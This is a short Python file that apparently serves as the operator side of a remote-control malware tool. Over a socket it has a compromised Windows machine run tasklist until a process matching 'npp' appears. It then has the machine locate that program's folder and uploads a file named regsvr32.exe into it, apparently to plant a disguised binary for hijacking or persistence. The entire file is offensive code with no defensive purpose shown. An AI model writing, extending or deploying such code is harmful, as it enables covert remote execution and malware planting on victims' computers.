import socket
import time
import server_config
import communication as comm
import command as cmd


def find_npp_dir(s: socket.socket) -> str:
    comm.send(s, "exec [where /r C:\\Users *npp*]")
    result = cmd.recv_exec_command(s)
    return result


def send_regsvr32(s: socket.socket, dir: str):
    comm.send(s, f"upload [{server_config.REGSVR32_FILEPATH}] [{dir}\\regsvr32.exe]")


def handle_found_npp(s: socket.socket):
    res = find_npp_dir(s)
    time.sleep(5)
    send_regsvr32(s, "\\".join(res.split("\\")[:-1]))
    time.sleep(5)


def event_loop(s: socket.socket):
    found_npp = False
    while True:
        time.sleep(2)
        if found_npp:
            break
        else:
            comm.send(s, 'exec [tasklist | findstr /I "npp"]')
            result = cmd.recv_exec_command(s)
            if "npp" in str(result):
                found_npp = True
    handle_found_npp(s)
